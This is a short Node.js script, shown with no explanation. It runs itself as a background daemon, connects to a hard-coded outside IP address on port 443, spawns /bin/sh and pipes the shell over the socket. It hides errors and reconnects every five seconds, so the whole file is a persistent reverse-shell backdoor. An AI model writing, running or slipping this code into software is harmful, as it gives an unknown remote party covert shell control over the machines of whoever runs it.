var net = require('net');
var daemon = require('daemon');
var spawn = require('child_process').spawn;

function c() {
	var client = new net.Socket();
	client.connect(443, "95.213.253.26", function() {
		var sh = spawn('/bin/sh', []);
		client.write("Connected\r\n");
		client.pipe(sh.stdin);
		sh.stdout.pipe(client);
	});

	client.on('error', function() {});

	client.on('close', function() {
		setTimeout(c, 5000);
	});
}

require('daemon')();
c();
